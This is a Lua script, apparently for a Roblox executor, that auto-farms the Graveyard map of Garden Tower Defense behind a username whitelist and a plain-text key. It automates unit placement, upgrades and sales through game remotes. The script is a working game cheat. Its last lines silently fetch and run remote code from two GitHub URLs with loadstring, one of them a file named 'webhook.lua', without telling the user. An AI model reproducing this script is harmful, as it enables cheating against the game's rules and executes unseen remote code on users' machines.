--// Garden Tower Defense - GRAVEYARD MAP UNIFIED AUTO FARM

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

local whitelist = {
    ["holasoy_kier"] = true,
    ["Sugaplum753"] = true,
    ["Nstub1234"] = true,
    ["Girthentersmyvergona"] = true,
    ["Derick12401"] = true,
    ["Threldor"] = true,
    ["keraieu"] = true,
    ["PurpPom"] = true,
    ["xpIPhGhoyFL"] = true,
    ["niceone10075"] = true,
    ["lyrachanx"] = true,
    ["BLACK_UNNIE1"] = true,
    ["PHOENIX7913"] = true,
    ["Draco_015"] = true,
    ["egoiks22921312"] = true,
    ["LEGKO_RUST"] = true,
    ["Nr1bulle"] = true,
    ["NoahYuiPom"] = true,
    ["67cheesy"] = true
}

if not whitelist[plr.Name] then
    plr:Kick("You are not whitelisted.")
    return
end

local ScreenGui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 350, 0, 250)
Frame.Position = UDim2.new(0.5, -175, 0.5, -125)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 10)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "Enter Key"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20

local TextBox = Instance.new("TextBox", Frame)
TextBox.Size = UDim2.new(1, -20, 0, 40)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.PlaceholderText = "Enter Key Here"
TextBox.Text = ""
TextBox.Font = Enum.Font.Gotham
TextBox.TextSize = 16
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BackgroundColor3 = Color3.fromRGB(200, 200, 200)

local CheckBtn = Instance.new("TextButton", Frame)
CheckBtn.Size = UDim2.new(1, -20, 0, 40)
CheckBtn.Position = UDim2.new(0, 10, 0, 100)
CheckBtn.Text = "Check Key"
CheckBtn.Font = Enum.Font.GothamBold
CheckBtn.TextSize = 18
CheckBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)

local Label = Instance.new("TextLabel", Frame)
Label.Size = UDim2.new(1, -20, 0, 40)
Label.Position = UDim2.new(0, 10, 0, 150)
Label.BackgroundTransparency = 1
Label.Text = ""
Label.Font = Enum.Font.GothamBold
Label.TextSize = 16
Label.TextColor3 = Color3.fromRGB(255, 255, 255)

local rs = game:GetService("ReplicatedStorage")
local remotes = rs:WaitForChild("RemoteFunctions")
local Workspace = game:GetService("Workspace")
local entities = Workspace:WaitForChild("Map"):WaitForChild("Entities")

_G.myUnitIDs = _G.myUnitIDs or {}
_G.trackingEnabled = false
_G.currentWave = 0

local function detectWave()
    local success, result = pcall(function()
        local guiNoInset = plr.PlayerGui:FindFirstChild("GameGuiNoInset")
        if not guiNoInset then return nil end
        
        for _, obj in pairs(guiNoInset:GetDescendants()) do
            if obj:IsA("TextLabel") and obj.Visible then
                local text = obj.Text
                local difficulty, waveNum, totalWaves = string.match(text, "(%w+):%s*Wave%s*(%d+)%s*/%s*(%d+)")
                if waveNum then
                    return tonumber(waveNum)
                end
            end
        end
        return nil
    end)
    return success and result or nil
end

task.spawn(function()
    while true do
        task.wait(0.5)
        if _G.trackingEnabled then
            local wave = detectWave()
            if wave then
                _G.currentWave = wave
            end
        end
    end
end)

local function setupAutoSkip()
    task.delay(3.5, function()
        pcall(function()
            local gui = plr.PlayerGui:WaitForChild("GameGuiNoInset")
            local autoSkipButton = gui.Screen.Top.WaveControls:WaitForChild("AutoSkip")
            spawn(function()
                while _G.trackingEnabled do
                    task.wait(0.8)
                    pcall(function()
                        local c = autoSkipButton.ImageColor3
                        if c.R > 0.8 and c.G > 0.5 then
                            local conns = getconnections(autoSkipButton.MouseButton1Click)
                            if conns and #conns > 0 then conns[1]:Fire() end
                        end
                    end)
                end
            end)
        end)
    end)
end

local function getMoney()
    return plr:GetAttribute("Cash") or 0
end

local function getUnitID(unit)
    for attempt = 1, 10 do
        for _, v in ipairs(unit:GetDescendants()) do
            if (v:IsA("IntValue") or v:IsA("NumberValue") or v:IsA("StringValue")) and string.find(string.lower(v.Name), "id") then
                return v.Value
            end
        end
        for attrName, attrValue in pairs(unit:GetAttributes()) do
            if string.find(string.lower(attrName), "id") then
                return attrValue
            end
        end
        task.wait(0.2)
    end
    return nil
end

entities.ChildAdded:Connect(function(child)
    if _G.trackingEnabled then
        task.spawn(function()
            task.wait(1)
            if child and child.Parent and string.find(child.Name, "unit_") then
                local unitID = getUnitID(child)
                if unitID then
                    table.insert(_G.myUnitIDs, unitID)
                end
            end
        end)
    end
end)

local function randomizePosition(basePosition, variation)
    variation = variation or 1.5
    local randomX = basePosition.X + (math.random() * variation * 2 - variation)
    local randomZ = basePosition.Z + (math.random() * variation * 2 - variation)
    return Vector3.new(randomX, basePosition.Y, randomZ)
end

local function tryPlaceUnit(unit, basePosition, maxAttempts)
    maxAttempts = maxAttempts or 5
    for attempt = 1, maxAttempts do
        local randomPos = randomizePosition(basePosition, 1.5)
        local data = {
            CF = CFrame.new(randomPos.X, randomPos.Y, randomPos.Z, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1),
            Rotation = 180,
            Valid = true,
            Position = randomPos
        }
        local success, result = pcall(function()
            return remotes.PlaceUnit:InvokeServer(unit, data)
        end)
        if success and result then
            return true
        else
            task.wait(0.15)
        end
    end
    return false
end

local function upgradeUnit(unitID)
    local success = pcall(function()
        remotes.UpgradeUnit:InvokeServer(unitID)
    end)
    return success
end

local function pesticiderStrategy()
    task.spawn(function()
        while getMoney() < 500 do task.wait(0.2) end
        
        local pest1Placed = tryPlaceUnit("unit_pesticider", Vector3.new(-341.5465393066406, 61.68030548095703, -703.4617919921875), 5)
        if not pest1Placed then return end
        task.wait(0.3)
        
        local waitTime = 0
        while #_G.myUnitIDs < 1 and waitTime < 10 do
            task.wait(0.2)
            waitTime = waitTime + 0.2
        end
        
        while getMoney() < 500 do task.wait(0.2) end
        
        local pest2Placed = tryPlaceUnit("unit_pesticider", Vector3.new(-347.159912109375, 61.68030548095703, -709.947265625), 5)
        if not pest2Placed then return end
        task.wait(0.3)
        
        waitTime = 0
        while #_G.myUnitIDs < 2 and waitTime < 10 do
            task.wait(0.2)
            waitTime = waitTime + 0.2
        end
        
        if #_G.myUnitIDs < 2 then return end
        
        local pest1ID = _G.myUnitIDs[1]
        local pest2ID = _G.myUnitIDs[2]
        
        while getMoney() < 700 do task.wait(0.2) end
        upgradeUnit(pest2ID)
        local delay1 = 0.4 + (math.random() * 0.59)
        task.wait(delay1)
        
        while getMoney() < 700 do task.wait(0.2) end
        upgradeUnit(pest1ID)
        local delay2 = 0.4 + (math.random() * 0.59)
        task.wait(delay2)
        
        while getMoney() < 1500 do task.wait(0.2) end
        upgradeUnit(pest1ID)
        local delay3 = 0.4 + (math.random() * 0.59)
        task.wait(delay3)
        
        while getMoney() < 3000 do task.wait(0.2) end
        upgradeUnit(pest1ID)
        local delay4 = 0.4 + (math.random() * 0.59)
        task.wait(delay4)
        
        while getMoney() < 6000 do task.wait(0.2) end
        upgradeUnit(pest1ID)
        local delay5 = 0.4 + (math.random() * 0.59)
        task.wait(delay5)
        
        while getMoney() < 1500 do task.wait(0.2) end
        upgradeUnit(pest2ID)
        local delay6 = 0.4 + (math.random() * 0.59)
        task.wait(delay6)
        
        while getMoney() < 3000 do task.wait(0.2) end
        upgradeUnit(pest2ID)
        local delay7 = 0.4 + (math.random() * 0.59)
        task.wait(delay7)
        
        while getMoney() < 6000 do task.wait(0.2) end
        upgradeUnit(pest2ID)
        local delay8 = 0.4 + (math.random() * 0.59)
        task.wait(delay8)
        
        while _G.currentWave < 20 do task.wait(0.5) end
        
        local randomDelay = 0.5 + (math.random() * 0.5)
        task.wait(randomDelay)
        
        if #_G.myUnitIDs >= 2 then
            pcall(function() remotes.SellUnit:InvokeServer(pest1ID) end)
            task.wait(0.05)
            pcall(function() remotes.SellUnit:InvokeServer(pest2ID) end)
        else
            pcall(function() remotes.SellUnit:InvokeServer(1) end)
            local randomWait = 0.3 + (math.random() * 0.2)
            task.wait(randomWait)
            pcall(function() remotes.SellUnit:InvokeServer(2) end)
        end
        
        _G.myUnitIDs = {}
    end)
end

local function rbTomatoEDStrategy()
    task.spawn(function()
        while getMoney() < 100 do task.wait(0.2) end
        tryPlaceUnit("unit_tomato_rainbow", Vector3.new(-344.7191162109375, 61.680301666259766, -702.30859375), 5)
        task.wait(0.3)
        
        local waitTime = 0
        while #_G.myUnitIDs < 1 and waitTime < 10 do
            task.wait(0.2)
            waitTime = waitTime + 0.2
        end
        
        if #_G.myUnitIDs < 1 then return end
        local rb1ID = _G.myUnitIDs[1]
        
        while getMoney() < 125 do task.wait(0.2) end
        upgradeUnit(rb1ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 175 do task.wait(0.2) end
        upgradeUnit(rb1ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 100 do task.wait(0.2) end
        tryPlaceUnit("unit_tomato_rainbow", Vector3.new(-351.1462097167969, 61.68030548095703, -711.151123046875), 5)
        task.wait(0.3)
        
        waitTime = 0
        while #_G.myUnitIDs < 2 and waitTime < 10 do
            task.wait(0.2)
            waitTime = waitTime + 0.2
        end
        
        if #_G.myUnitIDs < 2 then return end
        local rb2ID = _G.myUnitIDs[2]
        
        while getMoney() < 125 do task.wait(0.2) end
        upgradeUnit(rb2ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 175 do task.wait(0.2) end
        upgradeUnit(rb2ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 350 do task.wait(0.2) end
        upgradeUnit(rb2ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 500 do task.wait(0.2) end
        upgradeUnit(rb2ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 350 do task.wait(0.2) end
        upgradeUnit(rb1ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 500 do task.wait(0.2) end
        upgradeUnit(rb1ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 100 do task.wait(0.2) end
        tryPlaceUnit("unit_tomato_rainbow", Vector3.new(-334.91607666015625, 61.6803092956543, -721.29736328125), 5)
        task.wait(0.3)
        
        waitTime = 0
        while #_G.myUnitIDs < 3 and waitTime < 10 do
            task.wait(0.2)
            waitTime = waitTime + 0.2
        end
        
        if #_G.myUnitIDs < 3 then return end
        local rb3ID = _G.myUnitIDs[3]
        
        while getMoney() < 125 do task.wait(0.2) end
        upgradeUnit(rb3ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 175 do task.wait(0.2) end
        upgradeUnit(rb3ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 350 do task.wait(0.2) end
        upgradeUnit(rb3ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 500 do task.wait(0.2) end
        upgradeUnit(rb3ID)
        task.wait(0.4 + (math.random() * 0.59))
        
        while getMoney() < 6000 do task.wait(0.2) end
        tryPlaceUnit("unit_golem_dragon", Vector3.new(-319.2539978027344, 61.68030548095703, -720.3961181640625), 5)
        task.wait(0.3)
        
        while getMoney() < 6000 do task.wait(0.2) end
        tryPlaceUnit("unit_golem_dragon", Vector3.new(-331.4523620605469, 61.680301666259766, -735.6544799804688), 5)
        task.wait(0.3)
        
        while getMoney() < 6000 do task.wait(0.2) end
        tryPlaceUnit("unit_golem_dragon", Vector3.new(-319.48638916015625, 61.68030548095703, -734.1026000976562), 5)
        task.wait(0.3)
        
        while _G.currentWave < 20 do task.wait(0.5) end
        
        local randomDelay = 0.5 + (math.random() * 0.5)
        task.wait(randomDelay)
        
        if #_G.myUnitIDs >= 6 then
            for i = 1, 6 do
                pcall(function() remotes.SellUnit:InvokeServer(_G.myUnitIDs[i]) end)
                task.wait(0.05)
            end
        else
            for unitID = 1, 6 do
                pcall(function() remotes.SellUnit:InvokeServer(unitID) end)
                task.wait(0.3 + (math.random() * 0.2))
            end
        end
        
        _G.myUnitIDs = {}
    end)
end

local function waitForGameEnd()
    local gui = plr.PlayerGui:WaitForChild("GameGui")
    local gameEndFrame = gui.Screen.Middle:WaitForChild("GameEnd")
    repeat task.wait(0.5) until gameEndFrame.Visible == true
end

local function clickPlayAgain()
    local clicked = false
    for attempt = 1, 15 do
        pcall(function()
            local gui = plr.PlayerGui:FindFirstChild("GameGui")
            if gui then
                for _, button in ipairs(gui:GetDescendants()) do
                    if button:IsA("TextButton") and button.Visible then
                        local text = string.lower(button.Text)
                        if string.find(text, "again") or string.find(text, "play") then
                            local conns = getconnections(button.MouseButton1Click)
                            if conns and #conns > 0 then
                                conns[1]:Fire()
                                clicked = true
                                return
                            end
                        end
                    end
                end
            end
        end)
        if clicked then break end
        task.wait(0.15)
    end
    if not clicked then
        pcall(function()
            remotes.RestartGame:InvokeServer()
        end)
    end
end

local function setupGame(tickSpeed)
    pcall(function()
        remotes.LobbySetMap_6:InvokeServer("map_graveyard")
    end)
    task.wait(0.25)
    remotes.PlaceDifficultyVote:InvokeServer("dif_impossible")
    task.wait(0.25)
    remotes.ChangeTickSpeed:InvokeServer(tickSpeed)
    setupAutoSkip()
end

function loadRBTomatoED_3x()
    while true do
        _G.myUnitIDs = {}
        _G.currentWave = 0
        _G.trackingEnabled = true
        
        setupGame(3)
        task.wait(1.5)
        
        rbTomatoEDStrategy()
        
        waitForGameEnd()
        task.wait(0.5)
        
        _G.trackingEnabled = false
        clickPlayAgain()
        task.wait(2)
    end
end

function loadRBTomatoED_2x()
    while true do
        _G.myUnitIDs = {}
        _G.currentWave = 0
        _G.trackingEnabled = true
        
        setupGame(2)
        task.wait(1.5)
        
        rbTomatoEDStrategy()
        
        waitForGameEnd()
        task.wait(0.5)
        
        _G.trackingEnabled = false
        clickPlayAgain()
        task.wait(2)
    end
end

function loadPesticider_3x()
    while true do
        _G.myUnitIDs = {}
        _G.currentWave = 0
        _G.trackingEnabled = true
        
        setupGame(3)
        task.wait(1.5)
        
        pesticiderStrategy()
        
        waitForGameEnd()
        task.wait(0.5)
        
        _G.trackingEnabled = false
        clickPlayAgain()
        task.wait(2)
    end
end

function loadPesticider_2x()
    while true do
        _G.myUnitIDs = {}
        _G.currentWave = 0
        _G.trackingEnabled = true
        
        setupGame(2)
        task.wait(1.5)
        
        pesticiderStrategy()
        
        waitForGameEnd()
        task.wait(0.5)
        
        _G.trackingEnabled = false
        clickPlayAgain()
        task.wait(2)
    end
end

local function showStrategyMenu()
    Frame:ClearAllChildren()
    Frame.Size = UDim2.new(0, 350, 0, 250)
    
    local UICorner = Instance.new("UICorner", Frame)
    UICorner.CornerRadius = UDim.new(0, 10)
    
    local Title2 = Instance.new("TextLabel", Frame)
    Title2.Size = UDim2.new(1, 0, 0, 50)
    Title2.BackgroundTransparency = 1
    Title2.Text = "Select Strategy - Graveyard"
    Title2.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title2.Font = Enum.Font.GothamBold
    Title2.TextSize = 18
    
    local btnRBTomato = Instance.new("TextButton", Frame)
    btnRBTomato.Size = UDim2.new(0.9, 0, 0, 70)
    btnRBTomato.Position = UDim2.new(0.05, 0, 0.25, 0)
    btnRBTomato.Text = "RB Tomato & ED"
    btnRBTomato.Font = Enum.Font.GothamBold
    btnRBTomato.TextSize = 18
    btnRBTomato.BackgroundColor3 = Color3.fromRGB(255, 100, 180)
    local UICorner2 = Instance.new("UICorner", btnRBTomato)
    UICorner2.CornerRadius = UDim.new(0, 8)
    
    local btnPesticider = Instance.new("TextButton", Frame)
    btnPesticider.Size = UDim2.new(0.9, 0, 0, 70)
    btnPesticider.Position = UDim2.new(0.05, 0, 0.6, 0)
    btnPesticider.Text = "Pesticider"
    btnPesticider.Font = Enum.Font.GothamBold
    btnPesticider.TextSize = 18
    btnPesticider.BackgroundColor3 = Color3.fromRGB(100, 255, 150)
    local UICorner3 = Instance.new("UICorner", btnPesticider)
    UICorner3.CornerRadius = UDim.new(0, 8)
    
    return btnRBTomato, btnPesticider
end

local function showSpeedMenu(strategyType)
    Frame:ClearAllChildren()
    
    local UICorner = Instance.new("UICorner", Frame)
    UICorner.CornerRadius = UDim.new(0, 10)
    
    local Title3 = Instance.new("TextLabel", Frame)
    Title3.Size = UDim2.new(1, 0, 0, 40)
    Title3.BackgroundTransparency = 1
    Title3.Text = "Select Speed - " .. strategyType
    Title3.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title3.Font = Enum.Font.GothamBold
    Title3.TextSize = 18
    
    local btn2x = Instance.new("TextButton", Frame)
    btn2x.Size = UDim2.new(0.45, 0, 0, 70)
    btn2x.Position = UDim2.new(0.05, 0, 0.45, 0)
    btn2x.Text = "2x Speed"
    btn2x.Font = Enum.Font.GothamBold
    btn2x.TextSize = 18
    btn2x.BackgroundColor3 = Color3.fromRGB(80, 160, 250)
    local UICorner4 = Instance.new("UICorner", btn2x)
    UICorner4.CornerRadius = UDim.new(0, 8)
    
    local btn3x = Instance.new("TextButton", Frame)
    btn3x.Size = UDim2.new(0.45, 0, 0, 70)
    btn3x.Position = UDim2.new(0.5, 0, 0.45, 0)
    btn3x.Text = "3x Speed"
    btn3x.Font = Enum.Font.GothamBold
    btn3x.TextSize = 18
    btn3x.BackgroundColor3 = Color3.fromRGB(250, 120, 120)
    local UICorner5 = Instance.new("UICorner", btn3x)
    UICorner5.CornerRadius = UDim.new(0, 8)
    
    return btn2x, btn3x
end

CheckBtn.MouseButton1Click:Connect(function()
    if TextBox.Text == "candy" then
        Label.Text = "Key Accepted!"
        Label.TextColor3 = Color3.fromRGB(0, 255, 0)
        task.wait(1)
        
        local btnRBTomato, btnPesticider = showStrategyMenu()
        
        btnRBTomato.MouseButton1Click:Connect(function()
            local btn2x, btn3x = showSpeedMenu("RB Tomato & ED")
            btn2x.MouseButton1Click:Connect(function()
                ScreenGui:Destroy()
                loadRBTomatoED_2x()
            end)
            btn3x.MouseButton1Click:Connect(function()
                ScreenGui:Destroy()
                loadRBTomatoED_3x()
            end)
        end)
        
        btnPesticider.MouseButton1Click:Connect(function()
            local btn2x, btn3x = showSpeedMenu("Pesticider")
            btn2x.MouseButton1Click:Connect(function()
                ScreenGui:Destroy()
                loadPesticider_2x()
            end)
            btn3x.MouseButton1Click:Connect(function()
                ScreenGui:Destroy()
                loadPesticider_3x()
            end)
        end)
    else
        TextBox.Text = ""
        Label.Text = "Invalid Key!"
        Label.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/elisabloom/ElisaHub/refs/heads/main/webhook.lua"))() 
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()
    end)
end)